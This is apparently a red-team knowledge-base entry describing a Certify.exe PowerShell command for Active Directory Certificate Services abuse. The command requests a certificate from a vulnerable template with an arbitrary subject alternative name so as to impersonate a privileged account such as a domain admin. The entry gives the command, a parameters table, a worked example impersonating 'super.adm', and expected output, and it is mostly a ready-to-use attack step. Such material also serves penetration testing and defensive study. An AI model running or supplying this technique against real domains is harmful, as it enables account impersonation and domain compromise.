---
type: command
executor: powershell
data: 'Certify.exe request /template:$_TEMPLATE /altname:$_ALTNAME'
output: null
platforms:
  - Windows
tags:
  - adcs
  - certificate-request
verified: true
validated: true
---

# certify-request-user-certificate-with-san

## Command

```powershell
Certify.exe request /template:$_TEMPLATE /altname:$_ALTNAME
```

## Description

Requests a certificate from a vulnerable template, specifying an arbitrary SAN for impersonation (e.g., domain admin UPN).

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /template:$_TEMPLATE | Certificate template name (e.g., User) | Yes |
| /altname:$_ALTNAME | Arbitrary SAN value (e.g., admin@domain.com) | Yes |

## Examples

### Basic Usage

```powershell
Certify.exe request /template:User /altname:super.adm
```

## Expected Output

Request details including ID: "Request ID: 12345, Status: Pending"

## Related

- [[procedures/Vulnerable-Certificate-Authority-Access-Control]]
